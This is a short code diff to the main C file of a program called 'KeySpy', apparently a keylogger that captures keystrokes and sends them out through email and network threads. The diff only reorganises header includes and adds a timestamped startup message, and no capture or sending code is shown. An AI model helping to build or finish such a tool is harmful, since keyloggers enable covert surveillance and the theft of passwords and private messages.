@@ -3,18 +3,20 @@
 #include <stdint.h>
 #include <pthread.h>
 #include <unistd.h>
-#include "file_handler.h"
-#include "send_email.h"
 #include "core_state.h"
-#include "keyboard_handler.h"
-#include "keylogger.h"
-#include "network.h"
+#include "utils/helpers.h"
+#include "keylogger/keylogger.h"
+#include "network/network.h"
 
 int main() {
     HandlerContext context;
     pthread_t thread_read, thread_send_email, thread_network;
     void *retval_read, *retval_send, *retval_net;
     int code_read, code_send, code_net;
+    char time_str[9];
+
+    get_current_time(time_str, sizeof(time_str));
+    printf("KeySpy started: %s\n", time_str);
 
     if (init_state()){
         return EXIT_FAILURE;
